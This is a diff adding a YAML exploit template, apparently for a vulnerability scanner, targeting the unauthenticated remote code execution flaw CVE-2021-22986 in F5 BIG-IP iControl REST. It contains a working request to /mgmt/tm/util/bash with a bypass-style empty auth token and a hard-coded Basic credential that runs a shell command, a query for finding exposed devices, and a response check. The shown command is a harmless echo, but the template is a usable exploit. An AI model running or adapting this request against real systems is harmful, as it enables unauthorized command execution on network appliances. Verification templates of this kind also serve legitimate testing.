@@ -1,0 +1,22 @@
+name: F5 BIG-IP代码执行漏洞（CVE-2021-22986）exp
+manual: true
+query: product="F5-BIGIP"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /mgmt/tm/util/bash
+      headers:
+        Authorization: Basic YWRtaW46QVNhc1M=
+        X-F5-Auth-Token: ""
+      body: '{"command":"run","utilCmdArgs":"-c ''echo tsxts|base64''"}'
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"dHN4dHMK")
+expression: r0()
+detail:
+  author: k3vi_07@icloud.com
+  links:
+  - https://www.freebuf.com/vuls/268254.html
+  description: F5 BIG-IP/BIG-IQ iControl REST 未授权远程代码执行漏洞中，未经身份验证的攻击者可通过iControl REST接口，构造恶意请求，执行任意系统命令。
+  tags: RCE
